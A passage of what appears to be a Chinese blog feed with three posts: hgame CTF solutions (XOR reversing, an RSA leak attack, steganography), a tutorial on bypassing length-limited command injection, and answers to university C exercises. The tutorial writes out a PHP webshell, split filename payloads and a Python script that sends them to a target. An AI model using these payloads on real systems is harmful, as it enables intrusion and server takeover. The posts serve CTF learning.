class="hljs-number">69</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">121</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">117</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">51</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">91</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">115</span>,<br>    <span class="hljs-number">49</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">124</span>,<br>    <span class="hljs-number">2</span>,<br>]<br>c = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br><span class="hljs-comment"># input = input(&#x27;plz input flag:&#x27;)</span><br>flagG = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">37</span>, <span class="hljs-number">1</span>):<br>    flagG += <span class="hljs-built_in">chr</span>(flag[i] ^ c[i % <span class="hljs-number">4</span>])<br><br><span class="hljs-built_in">print</span>(flagG)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125;</code></font></center></strong></em></p><h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>把文件脱壳放入ida得</p><p><img src="/posts/b4162f1f/image-20240205023940415.png" alt="image-20240205023940415"></p><p><img src="/posts/b4162f1f/image-20240205024030914.png" alt="image-20240205024030914"></p><p>也是异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">data = (<br>    [<br>        <span class="hljs-number">100</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">118</span>,<br>        <span class="hljs-number">115</span>,<br>        <span class="hljs-number">96</span>,<br>        <span class="hljs-number">73</span>,<br>        <span class="hljs-number">101</span>,<br>        <span class="hljs-number">93</span>,<br>        <span class="hljs-number">69</span>,<br>        <span class="hljs-number">19</span>,<br>        <span class="hljs-number">107</span>,<br>        <span class="hljs-number">2</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">89</span>,<br>        <span class="hljs-number">92</span>,<br>        <span class="hljs-number">2</span>,<br>        <span class="hljs-number">69</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">6</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">94</span>,<br>        <span class="hljs-number">3</span>,<br>    ]<br>    + [<span class="hljs-number">70</span>, <span class="hljs-number">70</span>]<br>    + [<span class="hljs-number">94</span>, <span class="hljs-number">1</span>, <span class="hljs-number">109</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">109</span>, <span class="hljs-number">103</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">19</span>, <span class="hljs-number">79</span>, <span class="hljs-number">50</span>]<br>    + [<span class="hljs-number">0</span>] * <span class="hljs-number">11</span><br>)<br><br><span class="hljs-comment"># 与50进行异或并转换为字符</span><br>result = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(i ^ <span class="hljs-number">50</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data)<br><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>VIDAR&#123;Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!&#125;</code></font></center></strong></em></p><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>ida打开就行</p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;W3lc0me_T0_Th3_World_of_Rev3rse!&#125;</code></font></center></strong></em></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x10001</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>leak1=<span class="hljs-built_in">pow</span>(p,q,n)<br>leak2=<span class="hljs-built_in">pow</span>(q,p,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;leak1=<span class="hljs-subst">&#123;leak1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;leak2=<span class="hljs-subst">&#123;leak2&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c=<span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br><span class="hljs-string">leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br><span class="hljs-string">c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>e = <span class="hljs-number">0x10001</span><br>leak1 = <span class="hljs-number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br>leak2 = <span class="hljs-number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br>c = <span class="hljs-number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><br><br>phi = (leak1 - <span class="hljs-number">1</span>) * (leak2 - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, leak1 * leak2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125;</code></font></center></strong></em></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Simple-Attack"><a href="#Simple-Attack" class="headerlink" title="Simple Attack"></a>Simple Attack</h2><p>ZIP明文攻击，使用 ARCHPR</p><p><img src="/posts/b4162f1f/image-20240205031619809.png" alt="image-20240205031619809"></p><p>解密得到 base64 图片</p><p><img src="/posts/b4162f1f/image-20240205031703432.png" alt="image-20240205031703432"></p><h2 id="来自星尘的呼唤"><a href="#来自星尘的呼唤" class="headerlink" title="来自星尘的呼唤"></a>来自星尘的呼唤</h2><blockquote><p>一个即将发售的游戏的主角薇^3带来了一条消息。这段消息隐藏在加密的图片里 但即使解开了图片的六位弱加密,看到的也是一张迷惑的图片。 也许游戏的官网上有这种文字的记录? 补充：flag格式为<code>hgame\&#123;[a-z0-9_]+\&#125;</code></p></blockquote><p>弱密码猜测123456</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">steghide extract -sf xxx.jpg -p 123456<br></code></pre></td></tr></table></figure><p>得到图片和前端网页，看了 js ，猜测要去游戏官网下载字体，得到</p><p><img src="/posts/b4162f1f/image-20240205144517869.png" alt="image-20240205144517869"></p><h2 id="希儿希儿希儿"><a href="#希儿希儿希儿" class="headerlink" title="希儿希儿希儿"></a>希儿希儿希儿</h2><blockquote><p>Ch405是一名忠实的希儿厨，于是他出了一道这样的题，不过他似乎忘了这个加密的名字不是希儿了（x虽然经常有人叫错 补充： 图片打不开是正常现象,需要修复 最终得到的大写字母请用hgame{}包裹</p></blockquote><p>根据提示猜测是希尔加密，图片需要根据 crc 还原宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;secret.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()  <span class="hljs-comment"># 打开图片</span><br>crc32frombp = <span class="hljs-built_in">int</span>(crcbp[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)  <span class="hljs-comment"># 读取图片中的CRC校验值</span><br><span class="hljs-built_in">print</span>(crc32frombp)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):  <span class="hljs-comment"># 宽度1-4000进行枚举</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):  <span class="hljs-comment"># 高度1-4000进行枚举</span><br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, i) + struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, j) + crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-comment"># print(crc32)</span><br>        <span class="hljs-keyword">if</span> (<br>            crc32 == crc32frombp<br>        ):  <span class="hljs-comment"># 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex:&quot;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">303792205<br>1394 1999<br>hex: 0x572 0x7cf<br></code></pre></td></tr></table></figure><p>通过 stegsolver 打开，得到</p><p><img src="/posts/b4162f1f/image-20240205145700052.png" alt="image-20240205145700052"></p><p>用 foremost</p><p><img src="/posts/b4162f1f/image-20240205145802777.png" alt="image-20240205145802777"></p><p>得到 <code>CVOCRJGMKLDJGBQIUIVXHEYLPNWR</code></p><p><img src="/posts/b4162f1f/image-20240205145822199.png" alt="image-20240205145822199"></p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;DISAPPEARINTHESEAOFBUTTERFLY&#125;</code></font></center></strong></em></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有长度限制的RCE注入</title>
    <link href="/posts/34863/"/>
    <url>/posts/34863/</url>
    
    <content type="html"><![CDATA[<h1 id="有长度限制的RCE注入"><a href="#有长度限制的RCE注入" class="headerlink" title="有长度限制的RCE注入"></a>有长度限制的RCE注入</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="与"><a href="#与" class="headerlink" title="&gt;与&gt;&gt;"></a><code>&gt;</code>与<code>&gt;&gt;</code></h3><p>我们知道Linux中，有<code>&gt;</code>和<code>&gt;&gt;</code>命令</p><blockquote><ul><li>我们可以通过<code>&gt;</code>来创建新文件</li></ul><p><img src="/posts/34863/image-20231209152729849.png" alt="image-20231209152729849"></p><ul><li>同时<code>&gt;</code>也可以用来往文件存入内容，但是使用<code>&gt;</code>会直接覆盖文件为你需要的内容，如果文件不存在，那么新建文件再放入你需要的内容</li></ul><p><img src="/posts/34863/image-20231209153007009.png" alt="image-20231209153007009"></p><ul><li><p>而<code>&gt;&gt;</code>则是往文件中追加新内容，不会覆盖原文件，同样的如果文件不存在也会新建文件再追加</p><p><img src="/posts/34863/image-20231209153252038.png" alt="image-20231209153252038"></p></li></ul></blockquote><h3 id="多行命令"><a href="#多行命令" class="headerlink" title="多行命令"></a>多行命令</h3><p>同样是在Linux中，我们可以采用在没写完的命令后写入<code>\</code>的方式，实现多行命令</p><p><img src="/posts/34863/image-20231209153724846.png" alt="image-20231209153724846"></p><p>同时我们也可以将命令如上图一样写入文件，并使用<code>sh</code>执行该文件</p><p><img src="/posts/34863/image-20231209154124667.png" alt="image-20231209154124667"></p><ul><li>注意这里要使用<code>&gt;&gt;</code>追加命令</li></ul><h3 id="ls-t"><a href="#ls-t" class="headerlink" title="ls -t"></a><code>ls -t</code></h3><p>Linux中，<code>ls -t</code>可以让文件按照时间进行排序（时间靠后的排在前面）</p><p><img src="/posts/34863/image-20231209154743546.png" alt="image-20231209154743546"></p><p>同时也可以与上述命令构造<code>ls -t &gt; cmd</code></p><p><img src="/posts/34863/image-20231209155053407.png" alt="image-20231209155053407"></p><p>是不是跟<strong>多行命令</strong>中的很像，所以如果我们把文件名写为片段化的命令，就可以用<code>sh</code>来实现执行命令</p><p><img src="/posts/34863/image-20231209155525230.png" alt="image-20231209155525230"></p><p>之所以是<code>\\</code>是因为防止引号转义实际上只有一个<code>\</code>写入</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>访问题目地址</p><p><img src="/posts/34863/image-20231018232631239.png" alt="rce-1"></p><p>观察代码，filter函数中做了过滤，接下来的代码对Get的内容做了长度限制，可以用到我们上面学到的知识</p><p>于是构造一下<code>payload</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment"># 需要写入的一句话木马</span><br><br>PD9waHAgZXZhbCgkX0dFVFsxXSk7 <span class="hljs-comment"># base64编码后</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php # 组合一下<br></code></pre></td></tr></table></figure><p>解释一下</p><ul><li><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7</code> 是一个将Base64编码字符串输出到标准输出的命令</li><li><code>base64 -d</code> 是一个Base64解码的命令。在这里，它将接收前一个命令输出的Base64编码字符串，并解码成原始的二进制数据</li><li><code>&gt; 1.php</code> 将解码后的二进制数据保存到一个名为 <code>1.php</code> 的文件中</li></ul><p>命令挺长的所以我们可以写个脚本来自动执行一下</p><p>payload.txt:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">hp</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.p\\</span><br><span class="language-bash">&gt;d\&gt;\\</span><br><span class="language-bash">&gt;\ -\\</span><br><span class="language-bash">&gt;e64\\</span><br><span class="language-bash">&gt;bas\\</span><br><span class="language-bash">&gt;7\|\\</span><br><span class="language-bash">&gt;XSk\\</span><br><span class="language-bash">&gt;Fsx\\</span><br><span class="language-bash">&gt;dFV\\</span><br><span class="language-bash">&gt;kX0\\</span><br><span class="language-bash">&gt;bCg\\</span><br><span class="language-bash">&gt;XZh\\</span><br><span class="language-bash">&gt;AgZ\\</span><br><span class="language-bash">&gt;waH\\</span><br><span class="language-bash">&gt;PD9\\</span><br><span class="language-bash">&gt;o\ \\</span><br><span class="language-bash">&gt;ech\\</span><br><span class="language-bash"><span class="hljs-built_in">ls</span> -t&gt;0</span><br>sh 0<br></code></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://xxx/?6=&#123;0&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]start attack!!!&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + url.<span class="hljs-built_in">format</span>(i.strip()))<br>        requests.get(url.<span class="hljs-built_in">format</span>(i.strip()))<br><br><span class="hljs-comment"># 检查是否攻击成功</span><br>test = requests.get(<br>    <span class="hljs-string">&quot;http://xxx/sandbox/xxxx/1.php&quot;</span><br>)<br><span class="hljs-keyword">if</span> test.status_code == requests.codes.ok:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Attack success!!!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>现在访问<code>1.php</code>便可以正常的命令执行了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UESTC-iCoding-F1</title>
    <link href="/posts/47483/"/>
    <url>/posts/47483/</url>
    
    <content type="html"><![CDATA[<h1 id="UESTC-信软-iCoding-F1-Answer"><a href="#UESTC-信软-iCoding-F1-Answer" class="headerlink" title="[UESTC-信软] iCoding F1 Answer"></a>[UESTC-信软] iCoding F1 Answer</h1><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h3 id="计算税金-Tax"><a href="#计算税金-Tax" class="headerlink" title="计算税金(Tax)"></a>计算税金(Tax)</h3><blockquote><p>编写一个程序，要求用户输入一个美元数量，然后显示出增加 5% 税率后的相应金额。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter an amount: 100.00<br>with tax added: $105.00</p></blockquote><p>输入的金额为大于 0 的两位数浮点数。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">float</span> a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter an amount: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;a);<br>    a *= <span class="hljs-number">1.05</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;with tax added: $%.2f&quot;</span>, a);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="计算账单（Bills）"><a href="#计算账单（Bills）" class="headerlink" title="计算账单（Bills）"></a>计算账单（Bills）</h3><blockquote><p>编写⼀个程序，要求用户输出⼀个美元数量，然后显示出如何用最少20美元、10美元、5美元和1美元来付款。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a dollar amount: 93<br>$20 bills: 4<br>$10 bills: 1<br>$5 bills: 0<br>$1 bills: 3</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> dollar, b, c, d, e;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a dollar amount: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;dollar);<br>    b = dollar / <span class="hljs-number">20</span>;<br>    c = (dollar - b * <span class="hljs-number">20</span>) / <span class="hljs-number">10</span>;<br>    d = (dollar - b * <span class="hljs-number">20</span> - c * <span class="hljs-number">10</span>) / <span class="hljs-number">5</span>;<br>    e = dollar - b * <span class="hljs-number">20</span> - c * <span class="hljs-number">10</span> - d * <span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$20 bills: %d\n&quot;</span>, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$10 bills: %d\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$5 bills: %d\n&quot;</span>, d);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$1 bills: %d\n&quot;</span>, e);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="还贷计算（Loan-Balance）"><a href="#还贷计算（Loan-Balance）" class="headerlink" title="还贷计算（Loan Balance）"></a>还贷计算（Loan Balance）</h3><blockquote><p>编程计算第一、第二、第三个月还贷后剩余的贷款金额。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter amout of loan: 20000.00<br>Enter interest rate: 6.0<br>Enter monthly payment: 386.66</p><p>Balance remaining after first payment: $19713.34<br>Balance remaining after second payment: $19425.25<br>Balance remaining after third payment: $19135.71</p></blockquote><p>提示：每个月的贷款余额减去还款金额后，还需要加上贷款余额与月利率的乘积。月利率的计算方法是把用户输入的利率转换成百分数再除以12。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">float</span> <span class="hljs-title function_">loanCount</span><span class="hljs-params">(<span class="hljs-type">float</span> loan, <span class="hljs-type">float</span> rate, <span class="hljs-type">float</span> payment)</span><br>&#123;<br>    loan = (loan - payment) + loan * rate;<br>    <span class="hljs-keyword">return</span> loan;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">float</span> loan, rate, payment;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter amout of loan: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;loan);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter interest rate: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;rate);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter monthly payment: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;payment);<br>    rate = rate / <span class="hljs-number">100</span> / <span class="hljs-number">12</span>;<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after first payment: $%.2f\n&quot;</span>, loan);<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after second payment: $%.2f\n&quot;</span>, loan);<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after third payment: $%.2f\n&quot;</span>, 